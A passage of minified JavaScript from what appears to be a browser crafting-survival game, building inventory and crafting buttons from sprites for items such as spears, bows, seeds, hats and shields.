      this.inv_buttons[le.SHOVEL_DIAMOND] = rs(60, 60, 0, sprite[Ie.INV_SHOVEL_DIAMOND], 3);
      this.inv_buttons[le.SHOVEL_DIAMOND].id = le.SHOVEL_DIAMOND;
      this.inv_buttons[le.SHOVEL_AMETHYST] = rs(60, 60, 0, sprite[Ie.INV_SHOVEL_AMETHYST], 3);
      this.inv_buttons[le.SHOVEL_AMETHYST].id = le.SHOVEL_AMETHYST;
      this.inv_buttons[le.SPANNER] = rs(60, 60, 0, sprite[Ie.INV_SPANNER], 3);
      this.inv_buttons[le.SPANNER].id = le.SPANNER;
      this.inv_buttons[le.KRAKEN_SKIN] = rs(60, 60, 0, sprite[Ie.INV_KRAKEN_SKIN], 3);
      this.inv_buttons[le.KRAKEN_SKIN].id = le.KRAKEN_SKIN;
      this.inv_buttons[le.KRAKEN_SKIN].info.img[2] = this.inv_buttons[le.KRAKEN_SKIN].info.img[0];
      this.inv_buttons[le.WATERING_CAN] = rs(60, 60, 0, sprite[Ie.INV_WATERING_CAN], 3);
      this.inv_buttons[le.WATERING_CAN].id = le.WATERING_CAN;
      this.inv_buttons[le.FLOUR] = rs(60, 60, 0, sprite[Ie.INV_FLOUR], 3);
      this.inv_buttons[le.FLOUR].id = le.FLOUR;
      this.inv_buttons[le.FLOUR].info.img[2] = this.inv_buttons[le.FLOUR].info.img[0];
      this.inv_buttons[le.WHEAT_SEED] = rs(60, 60, 0, sprite[Ie.INV_WHEAT_SEED], 3);
      this.inv_buttons[le.WHEAT_SEED].id = le.WHEAT_SEED;
      this.inv_buttons[le.COOKIE] = rs(60, 60, 0, sprite[Ie.INV_COOKIE], 3);
      this.inv_buttons[le.COOKIE].id = le.COOKIE;
      this.inv_buttons[le.WILD_WHEAT] = rs(60, 60, 0, sprite[Ie.INV_WILD_WHEAT], 3);
      this.inv_buttons[le.WILD_WHEAT].id = le.WILD_WHEAT;
      this.inv_buttons[le.WILD_WHEAT].info.img[2] = this.inv_buttons[le.WILD_WHEAT].info.img[0];
      this.inv_buttons[le.WINDMILL] = rs(60, 60, 0, sprite[Ie.INV_WINDMILL], 3);
      this.inv_buttons[le.WINDMILL].id = le.WINDMILL;
      this.inv_buttons[le.SUPER_DIVING_SUIT] = rs(60, 60, 0, sprite[Ie.INV_SUPER_DIVING_SUIT], 3);
      this.inv_buttons[le.SUPER_DIVING_SUIT].id = le.SUPER_DIVING_SUIT;
      this.inv_buttons[le.DIVING_MASK] = rs(60, 60, 0, sprite[Ie.INV_DIVING_MASK], 3);
      this.inv_buttons[le.DIVING_MASK].id = le.DIVING_MASK;
      this.inv_buttons[le.WATERING_CAN_FULL] = rs(60, 60, 0, sprite[Ie.INV_WATERING_CAN_FULL], 3);
      this.inv_buttons[le.WATERING_CAN_FULL].id = le.WATERING_CAN_FULL;
      this.inv_buttons[le.CAKE] = rs(60, 60, 0, sprite[Ie.INV_CAKE], 3);
      this.inv_buttons[le.CAKE].id = le.CAKE;
      this.inv_buttons[le.BREAD] = rs(60, 60, 0, sprite[Ie.INV_BREAD], 3);
      this.inv_buttons[le.BREAD].id = le.BREAD;
      this.inv_buttons[le.FOODFISH] = rs(60, 60, 0, sprite[Ie.INV_FOODFISH], 3);
      this.inv_buttons[le.FOODFISH].id = le.FOODFISH;
      this.inv_buttons[le.FOODFISH_COOKED] = rs(60, 60, 0, sprite[Ie.INV_FOODFISH_COOKED], 3);
      this.inv_buttons[le.FOODFISH_COOKED].id = le.FOODFISH_COOKED;
      this.inv_buttons[le.SCALES] = rs(60, 60, 0, sprite[Ie.INV_SCALES], 3);
      this.inv_buttons[le.SCALES].id = le.SCALES;
      this.inv_buttons[le.SCALES].info.img[2] = this.inv_buttons[le.SCALES].info.img[0];
      this.inv_buttons[le.GROUND] = rs(60, 60, 0, sprite[Ie.INV_GROUND], 3);
      this.inv_buttons[le.GROUND].id = le.GROUND;
      this.inv_buttons[le.GROUND].info.img[2] = this.inv_buttons[le.GROUND].info.img[0];
      this.inv_buttons[le.PLOT] = rs(60, 60, 0, sprite[Ie.INV_PLOT], 3);
      this.inv_buttons[le.PLOT].id = le.PLOT;
      this.inv_buttons[le.ICE] = rs(60, 60, 0, sprite[Ie.INV_ICE], 3);
      this.inv_buttons[le.ICE].id = le.ICE;
      this.inv_buttons[le.ICE].info.img[2] = this.inv_buttons[le.ICE].info.img[0];
      this.inv_buttons[le.BREAD_OVEN] = rs(60, 60, 0, sprite[Ie.INV_BREAD_OVEN], 3);
      this.inv_buttons[le.BREAD_OVEN].id = le.BREAD_OVEN;
      this.inv_buttons[le.SANDWICH] = rs(60, 60, 0, sprite[Ie.INV_SANDWICH], 3);
      this.inv_buttons[le.SANDWICH].id = le.SANDWICH;
      this.inv_buttons[le.DRAGON_HELMET] = rs(60, 60, 0, sprite[Ie.INV_DRAGON_HELMET], 3);
      this.inv_buttons[le.DRAGON_HELMET].id = le.DRAGON_HELMET;
      this.inv_buttons[le.DRAGON_SWORD] = rs(60, 60, 0, sprite[Ie.INV_DRAGON_SWORD], 3);
      this.inv_buttons[le.DRAGON_SWORD].id = le.DRAGON_SWORD;
      this.inv_buttons[le.DRAGON_ORB] = rs(60, 60, 0, sprite[Ie.INV_DRAGON_ORB], 3);
      this.inv_buttons[le.DRAGON_ORB].id = le.DRAGON_ORB;
      this.inv_buttons[le.DRAGON_ORB].info.img[2] = this.inv_buttons[le.DRAGON_ORB].info.img[0];
      this.inv_buttons[le.DRAGON_CUBE] = rs(60, 60, 0, sprite[Ie.INV_DRAGON_CUBE], 3);
      this.inv_buttons[le.DRAGON_CUBE].id = le.DRAGON_CUBE;
      this.inv_buttons[le.DRAGON_CUBE].info.img[2] = this.inv_buttons[le.DRAGON_CUBE].info.img[0];
      this.inv_buttons[le.LAVA_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_LAVA_SPEAR], 3);
      this.inv_buttons[le.LAVA_SPEAR].id = le.LAVA_SPEAR;
      this.inv_buttons[le.LAVA_SWORD] = rs(60, 60, 0, sprite[Ie.INV_LAVA_SWORD], 3);
      this.inv_buttons[le.LAVA_SWORD].id = le.LAVA_SWORD;
      this.inv_buttons[le.LAVA_ORB] = rs(60, 60, 0, sprite[Ie.INV_LAVA_ORB], 3);
      this.inv_buttons[le.LAVA_ORB].id = le.LAVA_ORB;
      this.inv_buttons[le.LAVA_ORB].info.img[2] = this.inv_buttons[le.LAVA_ORB].info.img[0];
      this.inv_buttons[le.LAVA_CUBE] = rs(60, 60, 0, sprite[Ie.INV_LAVA_CUBE], 3);
      this.inv_buttons[le.LAVA_CUBE].id = le.LAVA_CUBE;
      this.inv_buttons[le.LAVA_CUBE].info.img[2] = this.inv_buttons[le.LAVA_CUBE].info.img[0];
      this.inv_buttons[le.CROWN_GREEN] = rs(60, 60, 0, sprite[Ie.INV_CROWN_GREEN], 3);
      this.inv_buttons[le.CROWN_GREEN].id = le.CROWN_GREEN;
      this.inv_buttons[le.GEMME_GREEN] = rs(60, 60, 0, sprite[Ie.INV_GEMME_GREEN], 3);
      this.inv_buttons[le.GEMME_GREEN].id = le.GEMME_GREEN;
      this.inv_buttons[le.GEMME_GREEN].info.img[2] = this.inv_buttons[le.GEMME_GREEN].info.img[0];
      this.inv_buttons[le.GEMME_ORANGE] = rs(60, 60, 0, sprite[Ie.INV_GEMME_ORANGE], 3);
      this.inv_buttons[le.GEMME_ORANGE].id = le.GEMME_ORANGE;
      this.inv_buttons[le.GEMME_ORANGE].info.img[2] = this.inv_buttons[le.GEMME_ORANGE].info.img[0];
      this.inv_buttons[le.CROWN_ORANGE] = rs(60, 60, 0, sprite[Ie.INV_CROWN_ORANGE], 3);
      this.inv_buttons[le.CROWN_ORANGE].id = le.CROWN_ORANGE;
      this.inv_buttons[le.GEMME_BLUE] = rs(60, 60, 0, sprite[Ie.INV_GEMME_BLUE], 3);
      this.inv_buttons[le.GEMME_BLUE].id = le.GEMME_BLUE;
      this.inv_buttons[le.GEMME_BLUE].info.img[2] = this.inv_buttons[le.GEMME_BLUE].info.img[0];
      this.inv_buttons[le.CROWN_BLUE] = rs(60, 60, 0, sprite[Ie.INV_CROWN_BLUE], 3);
      this.inv_buttons[le.CROWN_BLUE].id = le.CROWN_BLUE;
      this.inv_buttons[le.HOOD] = rs(60, 60, 0, sprite[Ie.INV_HOOD], 3);
      this.inv_buttons[le.HOOD].id = le.HOOD;
      this.inv_buttons[le.PEASANT] = rs(60, 60, 0, sprite[Ie.INV_PEASANT], 3);
      this.inv_buttons[le.PEASANT].id = le.PEASANT;
      this.inv_buttons[le.SPECIAL_FUR] = rs(60, 60, 0, sprite[Ie.INV_SPECIAL_FUR], 3);
      this.inv_buttons[le.SPECIAL_FUR].id = le.SPECIAL_FUR;
      this.inv_buttons[le.SPECIAL_FUR_2] = rs(60, 60, 0, sprite[Ie.INV_SPECIAL_FUR_2], 3);
      this.inv_buttons[le.SPECIAL_FUR_2].id = le.SPECIAL_FUR_2;
      this.inv_buttons[le.WINTER_PEASANT] = rs(60, 60, 0, sprite[Ie.INV_WINTER_PEASANT], 3);
      this.inv_buttons[le.WINTER_PEASANT].id = le.WINTER_PEASANT;
      this.inv_buttons[le.WINTER_HOOD] = rs(60, 60, 0, sprite[Ie.INV_WINTER_HOOD], 3);
      this.inv_buttons[le.WINTER_HOOD].id = le.WINTER_HOOD;
      this.inv_buttons[le.BUCKET_FULL] = rs(60, 60, 0, sprite[Ie.INV_BUCKET_FULL], 3);
      this.inv_buttons[le.BUCKET_FULL].id = le.BUCKET_FULL;
      this.inv_buttons[le.BUCKET_EMPTY] = rs(60, 60, 0, sprite[Ie.INV_BUCKET_EMPTY], 3);
      this.inv_buttons[le.BUCKET_EMPTY].id = le.BUCKET_EMPTY;
      this.inv_buttons[le.WELL] = rs(60, 60, 0, sprite[Ie.INV_WELL], 3);
      this.inv_buttons[le.WELL].id = le.WELL;
      this.inv_buttons[le.SIGN] = rs(60, 60, 0, sprite[Ie.INV_SIGN], 3);
      this.inv_buttons[le.SIGN].id = le.SIGN;
      this.inv_buttons[le.PUMPKIN_SEED] = rs(60, 60, 0, sprite[Ie.INV_PUMPKIN_SEED], 3);
      this.inv_buttons[le.PUMPKIN_SEED].id = le.PUMPKIN_SEED;
      this.inv_buttons[le.PUMPKIN] = rs(60, 60, 0, sprite[Ie.INV_PUMPKIN], 3);
      this.inv_buttons[le.PUMPKIN].id = le.PUMPKIN;
      this.inv_buttons[le.GARLIC_SEED] = rs(60, 60, 0, sprite[Ie.INV_GARLIC_SEED], 3);
      this.inv_buttons[le.GARLIC_SEED].id = le.GARLIC_SEED;
      this.inv_buttons[le.GARLIC] = rs(60, 60, 0, sprite[Ie.INV_GARLIC], 3);
      this.inv_buttons[le.GARLIC].id = le.GARLIC;
      this.inv_buttons[le.ROOF] = rs(60, 60, 0, sprite[Ie.INV_ROOF], 3);
      this.inv_buttons[le.ROOF].id = le.ROOF;
      this.inv_buttons[le.THORNBUSH_SEED] = rs(60, 60, 0, sprite[Ie.INV_THORNBUSH_SEED], 3);
      this.inv_buttons[le.THORNBUSH_SEED].id = le.THORNBUSH_SEED;
      this.inv_buttons[le.THORNBUSH] = rs(60, 60, 0, sprite[Ie.INV_THORNBUSH], 3);
      this.inv_buttons[le.THORNBUSH].id = le.THORNBUSH;
      this.inv_buttons[le.CARROT_SEED] = rs(60, 60, 0, sprite[Ie.INV_CARROT_SEED], 3);
      this.inv_buttons[le.CARROT_SEED].id = le.CARROT_SEED;
      this.inv_buttons[le.CARROT] = rs(60, 60, 0, sprite[Ie.INV_CARROT], 3);
      this.inv_buttons[le.CARROT].id = le.CARROT;
      this.inv_buttons[le.TOMATO_SEED] = rs(60, 60, 0, sprite[Ie.INV_TOMATO_SEED], 3);
      this.inv_buttons[le.TOMATO_SEED].id = le.TOMATO_SEED;
      this.inv_buttons[le.TOMATO] = rs(60, 60, 0, sprite[Ie.INV_TOMATO], 3);
      this.inv_buttons[le.TOMATO].id = le.TOMATO;
      this.inv_buttons[le.WATERMELON_SEED] = rs(60, 60, 0, sprite[Ie.INV_WATERMELON_SEED], 3);
      this.inv_buttons[le.WATERMELON_SEED].id = le.WATERMELON_SEED;
      this.inv_buttons[le.WATERMELON] = rs(60, 60, 0, sprite[Ie.INV_WATERMELON], 3);
      this.inv_buttons[le.WATERMELON].id = le.WATERMELON;
      this.inv_buttons[le.ALOE_VERA_SEED] = rs(60, 60, 0, sprite[Ie.INV_ALOE_VERA_SEED], 3);
      this.inv_buttons[le.ALOE_VERA_SEED].id = le.ALOE_VERA_SEED;
      this.inv_buttons[le.ALOE_VERA] = rs(60, 60, 0, sprite[Ie.INV_ALOE_VERA], 3);
      this.inv_buttons[le.ALOE_VERA].id = le.ALOE_VERA;
      this.inv_buttons[le.CHRISTMAS_HAT] = rs(60, 60, 0, sprite[Ie.INV_CHRISTMAS_HAT], 3);
      this.inv_buttons[le.CHRISTMAS_HAT].id = le.CHRISTMAS_HAT;
      this.inv_buttons[le.ELF_HAT] = rs(60, 60, 0, sprite[Ie.INV_ELF_HAT], 3);
      this.inv_buttons[le.ELF_HAT].id = le.ELF_HAT;
      this.inv_buttons[le.WOOD_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_WOOD_SPEAR], 3);
      this.inv_buttons[le.WOOD_SPEAR].id = le.WOOD_SPEAR;
      this.inv_buttons[le.DRAGON_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_DRAGON_SPEAR], 3);
      this.inv_buttons[le.DRAGON_SPEAR].id = le.DRAGON_SPEAR;
      this.inv_buttons[le.CRAB_STICK] = rs(60, 60, 0, sprite[Ie.INV_CRAB_STICK], 3);
      this.inv_buttons[le.CRAB_STICK].id = le.CRAB_STICK;
      this.inv_buttons[le.CRAB_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_CRAB_SPEAR], 3);
      this.inv_buttons[le.CRAB_SPEAR].id = le.CRAB_SPEAR;
      this.inv_buttons[le.CRAB_LOOT] = rs(60, 60, 0, sprite[Ie.INV_CRAB_LOOT], 3);
      this.inv_buttons[le.CRAB_LOOT].id = le.CRAB_LOOT;
      this.inv_buttons[le.BED] = rs(60, 60, 0, sprite[Ie.INV_BED], 3);
      this.inv_buttons[le.BED].id = le.BED;
      this.inv_buttons[le.CROWN_CRAB] = rs(60, 60, 0, sprite[Ie.INV_CROWN_CRAB], 3);
      this.inv_buttons[le.CROWN_CRAB].id = le.CROWN_CRAB;
      this.inv_buttons[le.GARLAND] = rs(60, 60, 0, sprite[Ie.INV_GARLAND], 3);
      this.inv_buttons[le.GARLAND].id = le.GARLAND;
      this.inv_buttons[le.CANDY] = rs(60, 60, 0, sprite[Ie.INV_CANDY], 3);
      this.inv_buttons[le.CANDY].id = le.CANDY;
      this.inv_buttons[le.SUGAR_CAN] = rs(60, 60, 0, sprite[Ie.INV_SUGAR_CAN], 3);
      this.inv_buttons[le.SUGAR_CAN].id = le.SUGAR_CAN;
      this.craft_buttons = [];
      this.craft_buttons[ue.SWORD] = rs(60, 60, 0, sprite[Ie.CRAFT_SWORD], 3);
      this.craft_buttons[ue.SWORD].id = ue.SWORD;
      this.craft_buttons[ue.PICK] = rs(60, 60, 0, sprite[Ie.CRAFT_PICK], 3);
      this.craft_buttons[ue.PICK].id = ue.PICK;
      this.craft_buttons[ue.FIRE] = rs(60, 60, 0, sprite[Ie.CRAFT_FIRE], 3);
      this.craft_buttons[ue.FIRE].id = ue.FIRE;
      this.craft_buttons[ue.WORKBENCH] = rs(60, 60, 0, sprite[Ie.CRAFT_WORK], 3);
      this.craft_buttons[ue.WORKBENCH].id = ue.WORKBENCH;
      this.craft_buttons[ue.WALL] = rs(60, 60, 0, sprite[Ie.CRAFT_WALL], 3);
      this.craft_buttons[ue.WALL].id = ue.WALL;
      this.craft_buttons[ue.SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_SPIKE], 3);
      this.craft_buttons[ue.SPIKE].id = ue.SPIKE;
      this.craft_buttons[ue.SEED] = rs(60, 60, 0, sprite[Ie.CRAFT_SEED], 3);
      this.craft_buttons[ue.SEED].id = ue.SEED;
      this.craft_buttons[ue.PICK_GOLD] = rs(60, 60, 0, sprite[Ie.CRAFT_PICK_GOLD], 3);
      this.craft_buttons[ue.PICK_GOLD].id = ue.PICK_GOLD;
      this.craft_buttons[ue.PICK_DIAMOND] = rs(60, 60, 0, sprite[Ie.CRAFT_PICK_DIAMOND], 3);
      this.craft_buttons[ue.PICK_DIAMOND].id = ue.PICK_DIAMOND;
      this.craft_buttons[ue.SWORD_GOLD] = rs(60, 60, 0, sprite[Ie.CRAFT_SWORD_GOLD], 3);
      this.craft_buttons[ue.SWORD_GOLD].id = ue.SWORD_GOLD;
      this.craft_buttons[ue.SWORD_WOOD] = rs(60, 60, 0, sprite[Ie.CRAFT_SWORD_WOOD], 3);
      this.craft_buttons[ue.SWORD_WOOD].id = ue.SWORD_WOOD;
      this.craft_buttons[ue.SWORD_DIAMOND] = rs(60, 60, 0, sprite[Ie.CRAFT_SWORD_DIAMOND], 3);
      this.craft_buttons[ue.SWORD_DIAMOND].id = ue.SWORD_DIAMOND;
      this.craft_buttons[ue.PICK_WOOD] = rs(60, 60, 0, sprite[Ie.CRAFT_PICK_WOOD], 3);
      this.craft_buttons[ue.PICK_WOOD].id = ue.PICK_WOOD;
      this.craft_buttons[ue.COOKED_MEAT] = rs(60, 60, 0, sprite[Ie.CRAFT_COOKED_MEAT], 3);
      this.craft_buttons[ue.COOKED_MEAT].id = ue.COOKED_MEAT;
      this.craft_buttons[ue.BIG_FIRE] = rs(60, 60, 0, sprite[Ie.CRAFT_BIG_FIRE], 3);
      this.craft_buttons[ue.BIG_FIRE].id = ue.BIG_FIRE;
      this.craft_buttons[ue.BANDAGE] = rs(60, 60, 0, sprite[Ie.CRAFT_BANDAGE], 3);
      this.craft_buttons[ue.BANDAGE].id = ue.BANDAGE;
      this.craft_buttons[ue.STONE_WALL] = rs(60, 60, 0, sprite[Ie.CRAFT_STONE_WALL], 3);
      this.craft_buttons[ue.STONE_WALL].id = ue.STONE_WALL;
      this.craft_buttons[ue.GOLD_WALL] = rs(60, 60, 0, sprite[Ie.CRAFT_GOLD_WALL], 3);
      this.craft_buttons[ue.GOLD_WALL].id = ue.GOLD_WALL;
      this.craft_buttons[ue.DIAMOND_WALL] = rs(60, 60, 0, sprite[Ie.CRAFT_DIAMOND_WALL], 3);
      this.craft_buttons[ue.DIAMOND_WALL].id = ue.DIAMOND_WALL;
      this.craft_buttons[ue.WOOD_DOOR] = rs(60, 60, 0, sprite[Ie.CRAFT_DOOR_WOOD_CLOSE], 3);
      this.craft_buttons[ue.WOOD_DOOR].id = ue.WOOD_DOOR;
      this.craft_buttons[ue.CHEST] = rs(60, 60, 0, sprite[Ie.CRAFT_CHEST], 3);
      this.craft_buttons[ue.CHEST].id = ue.CHEST;
      this.craft_buttons[ue.STONE_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_STONE_SPIKE], 3);
      this.craft_buttons[ue.STONE_SPIKE].id = ue.STONE_SPIKE;
      this.craft_buttons[ue.GOLD_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_GOLD_SPIKE], 3);
      this.craft_buttons[ue.GOLD_SPIKE].id = ue.GOLD_SPIKE;
      this.craft_buttons[ue.DIAMOND_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_DIAMOND_SPIKE], 3);
      this.craft_buttons[ue.DIAMOND_SPIKE].id = ue.DIAMOND_SPIKE;
      this.craft_buttons[ue.BAG] = rs(60, 60, 0, sprite[Ie.CRAFT_BAG], 3);
      this.craft_buttons[ue.BAG].id = ue.BAG;
      this.craft_buttons[ue.EARMUFFS] = rs(60, 60, 0, sprite[Ie.CRAFT_EARMUFFS], 3);
      this.craft_buttons[ue.EARMUFFS].id = ue.EARMUFFS;
      this.craft_buttons[ue.STONE_DOOR] = rs(60, 60, 0, sprite[Ie.CRAFT_DOOR_STONE_CLOSE], 3);
      this.craft_buttons[ue.STONE_DOOR].id = ue.STONE_DOOR;
      this.craft_buttons[ue.GOLD_DOOR] = rs(60, 60, 0, sprite[Ie.CRAFT_DOOR_GOLD_CLOSE], 3);
      this.craft_buttons[ue.GOLD_DOOR].id = ue.GOLD_DOOR;
      this.craft_buttons[ue.DIAMOND_DOOR] = rs(60, 60, 0, sprite[Ie.CRAFT_DOOR_DIAMOND_CLOSE], 3);
      this.craft_buttons[ue.DIAMOND_DOOR].id = ue.DIAMOND_DOOR;
      this.craft_buttons[ue.EARMUFFS] = rs(60, 60, 0, sprite[Ie.CRAFT_EARMUFFS], 3);
      this.craft_buttons[ue.EARMUFFS].id = ue.EARMUFFS;
      this.craft_buttons[ue.COAT] = rs(60, 60, 0, sprite[Ie.CRAFT_COAT], 3);
      this.craft_buttons[ue.COAT].id = ue.COAT;
      this.craft_buttons[ue.WOOD_SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_WOOD_SPEAR], 3);
      this.craft_buttons[ue.WOOD_SPEAR].id = ue.WOOD_SPEAR;
      this.craft_buttons[ue.SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_SPEAR], 3);
      this.craft_buttons[ue.SPEAR].id = ue.SPEAR;
      this.craft_buttons[ue.GOLD_SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_GOLD_SPEAR], 3);
      this.craft_buttons[ue.GOLD_SPEAR].id = ue.GOLD_SPEAR;
      this.craft_buttons[ue.DIAMOND_SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_DIAMOND_SPEAR], 3);
      this.craft_buttons[ue.DIAMOND_SPEAR].id = ue.DIAMOND_SPEAR;
      this.craft_buttons[ue.DRAGON_SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_DRAGON_SPEAR], 3);
      this.craft_buttons[ue.DRAGON_SPEAR].id = ue.DRAGON_SPEAR;
      this.craft_buttons[ue.FURNACE] = rs(60, 60, 0, sprite[Ie.CRAFT_FURNACE], 3);
      this.craft_buttons[ue.FURNACE].id = ue.FURNACE;
      this.craft_buttons[ue.EXPLORER_HAT] = rs(60, 60, 0, sprite[Ie.CRAFT_EXPLORER_HAT], 3);
      this.craft_buttons[ue.EXPLORER_HAT].id = ue.EXPLORER_HAT;
      this.craft_buttons[ue.PIRATE_HAT] = rs(60, 60, 0, sprite[Ie.CRAFT_PIRATE_HAT], 3);
      this.craft_buttons[ue.PIRATE_HAT].id = ue.PIRATE_HAT;
      this.craft_buttons[ue.FLOWER_HAT] = rs(60, 60, 0, sprite[Ie.CRAFT_FLOWER_HAT], 3);
      this.craft_buttons[ue.FLOWER_HAT].id = ue.FLOWER_HAT;
      this.craft_buttons[ue.FUR_HAT] = rs(60, 60, 0, sprite[Ie.CRAFT_FUR_HAT], 3);
      this.craft_buttons[ue.FUR_HAT].id = ue.FUR_HAT;
      this.craft_buttons[ue.TURBAN1] = rs(60, 60, 0, sprite[Ie.CRAFT_TURBAN1], 3);
      this.craft_buttons[ue.TURBAN1].id = ue.TURBAN1;
      this.craft_buttons[ue.TURBAN2] = rs(60, 60, 0, sprite[Ie.CRAFT_TURBAN2], 3);
      this.craft_buttons[ue.TURBAN2].id = ue.TURBAN2;
      this.craft_buttons[ue.WOOD_BOW] = rs(60, 60, 0, sprite[Ie.CRAFT_WOOD_BOW], 3);
      this.craft_buttons[ue.WOOD_BOW].id = ue.WOOD_BOW;
      this.craft_buttons[ue.WOOD_ARROW] = rs(60, 60, 0, sprite[Ie.CRAFT_WOOD_ARROW], 3);
      this.craft_buttons[ue.WOOD_ARROW].id = ue.WOOD_ARROW;
      this.craft_buttons[ue.WOOD_SHIELD] = rs(60, 60, 0, sprite[Ie.CRAFT_WOOD_SHIELD], 3);
      this.craft_buttons[ue.WOOD_SHIELD].id = ue.WOOD_SHIELD;
      this.craft_buttons[ue.STONE_BOW] = rs(60, 60, 0, sprite[Ie.CRAFT_STONE_BOW], 3);
      this.craft_buttons[ue.STONE_BOW].id = ue.STONE_BOW;
      this.craft_buttons[ue.STONE_ARROW] = rs(60, 60, 0, sprite[Ie.CRAFT_STONE_ARROW], 3);
      this.craft_buttons[ue.STONE_ARROW].id = ue.STONE_ARROW;
      this.craft_buttons[ue.STONE_SHIELD] = rs(60, 60, 0, sprite[Ie.CRAFT_STONE_SHIELD], 3);
      this.craft_buttons[ue.STONE_SHIELD].id = ue.STONE_SHIELD;
      this.craft_buttons[ue.GOLD_BOW] = rs(60, 60, 0, sprite[Ie.CRAFT_GOLD_BOW], 3);
      this.craft_buttons[ue.GOLD_BOW].id = ue.GOLD_BOW;
      this.craft_buttons[ue.GOLD_ARROW] = rs(60, 60, 0, sprite[Ie.CRAFT_GOLD_ARROW], 3);
      this.craft_buttons[ue.GOLD_ARROW].id = ue.GOLD_ARROW;
      this.craft_buttons[ue.GOLD_SHIELD] = rs(60, 60, 0, sprite[Ie.CRAFT_GOLD_SHIELD], 3);
      this.craft_buttons[ue.GOLD_SHIELD].id = ue.GOLD_SHIELD;
      this.craft_buttons[ue.DIAMOND_BOW] = rs(60, 60, 0, sprite[Ie.CRAFT_DIAMOND_BOW], 3);
      this.craft_buttons[ue.DIAMOND_BOW].id = ue.DIAMOND_BOW;
      this.craft_buttons[ue.DIAMOND_ARROW] = rs(60, 60, 0, sprite[Ie.CRAFT_DIAMOND_ARROW], 3);
      this.craft_buttons[ue.DIAMOND_ARROW].id = ue.DIAMOND_ARROW;
      this.craft_buttons[ue.DIAMOND_SHIELD] = rs(60, 60, 0, sprite[Ie.CRAFT_DIAMOND_SHIELD], 3);
      this.craft_buttons[ue.DIAMOND_SHIELD].id = ue.DIAMOND_SHIELD;
      this.craft_buttons[ue.AMETHYST_BOW] = rs(60, 60, 0, sprite[Ie.CRAFT_AMETHYST_BOW], 3);
      this.craft_buttons[ue.AMETHYST_BOW].id = ue.AMETHYST_BOW;
      this.craft_buttons[ue.AMETHYST_ARROW] = rs(60, 60, 0, sprite[Ie.CRAFT_AMETHYST_ARROW], 3);
      this.craft_buttons[ue.AMETHYST_ARROW].id = ue.AMETHYST_ARROW;
      this.craft_buttons[ue.AMETHYST_SHIELD] = rs(60, 60, 0, sprite[Ie.CRAFT_AMETHYST_SHIELD], 3);
      this.craft_buttons[ue.AMETHYST_SHIELD].id = ue.AMETHYST_SHIELD;
      this.craft_buttons[ue.REIDITE_BOW] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_BOW], 3);
      this.craft_buttons[ue.REIDITE_BOW].id = ue.REIDITE_BOW;
      this.craft_buttons[ue.REIDITE_ARROW] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_ARROW], 3);
      this.craft_buttons[ue.REIDITE_ARROW].id = ue.REIDITE_ARROW;
      this.craft_buttons[ue.REIDITE_SHIELD] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_SHIELD], 3);
      this.craft_buttons[ue.REIDITE_SHIELD].id = ue.REIDITE_SHIELD;
      this.craft_buttons[ue.DRAGON_BOW] = rs(60, 60, 0, sprite[Ie.CRAFT_DRAGON_BOW], 3);
      this.craft_buttons[ue.DRAGON_BOW].id = ue.DRAGON_BOW;
      this.craft_buttons[ue.DRAGON_ARROW] = rs(60, 60, 0, sprite[Ie.CRAFT_DRAGON_ARROW], 3);
      this.craft_buttons[ue.DRAGON_ARROW].id = ue.DRAGON_ARROW;
      this.craft_buttons[ue.WOOD_HELMET] = rs(60, 60, 0, sprite[Ie.CRAFT_WOOD_HELMET], 3);
      this.craft_buttons[ue.WOOD_HELMET].id = ue.WOOD_HELMET;
      this.craft_buttons[ue.STONE_HELMET] = rs(60, 60, 0, sprite[Ie.CRAFT_STONE_HELMET], 3);
      this.craft_buttons[ue.STONE_HELMET].id = ue.STONE_HELMET;
      this.craft_buttons[ue.GOLD_HELMET] = rs(60, 60, 0, sprite[Ie.CRAFT_GOLD_HELMET], 3);
      this.craft_buttons[ue.GOLD_HELMET].id = ue.GOLD_HELMET;
      this.craft_buttons[ue.DIAMOND_HELMET] = rs(60, 60, 0, sprite[Ie.CRAFT_DIAMOND_HELMET], 3);
      this.craft_buttons[ue.DIAMOND_HELMET].id = ue.DIAMOND_HELMET;
      this.craft_buttons[ue.BOOK] = rs(60, 60, 0, sprite[Ie.CRAFT_BOOK], 3);
      this.craft_buttons[ue.BOOK].id = ue.BOOK;
      this.craft_buttons[ue.PAPER] = rs(60, 60, 0, sprite[Ie.CRAFT_PAPER], 3);
      this.craft_buttons[ue.PAPER].id = ue.PAPER;
      this.craft_buttons[ue.BAG] = rs(60, 60, 0, sprite[Ie.CRAFT_BAG], 3);
      this.craft_buttons[ue.BAG].id = ue.BAG;
      this.craft_buttons[ue.SWORD_AMETHYST] = rs(60, 60, 0, sprite[Ie.CRAFT_SWORD_AMETHYST], 3);
      this.craft_buttons[ue.SWORD_AMETHYST].id = ue.SWORD_AMETHYST;
      this.craft_buttons[ue.PIRATE_SWORD] = rs(60, 60, 0, sprite[Ie.CRAFT_PIRATE_SWORD], 3);
      this.craft_buttons[ue.PIRATE_SWORD].id = ue.PIRATE_SWORD;
      this.craft_buttons[ue.PICK_AMETHYST] = rs(60, 60, 0, sprite[Ie.CRAFT_PICK_AMETHYST], 3);
      this.craft_buttons[ue.PICK_AMETHYST].id = ue.PICK_AMETHYST;
      this.craft_buttons[ue.PICK_REIDITE] = rs(60, 60, 0, sprite[Ie.CRAFT_PICK_REIDITE], 3);
      this.craft_buttons[ue.PICK_REIDITE].id = ue.PICK_REIDITE;
      this.craft_buttons[ue.AMETHYST_SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_AMETHYST_SPEAR], 3);
      this.craft_buttons[ue.AMETHYST_SPEAR].id = ue.AMETHYST_SPEAR;
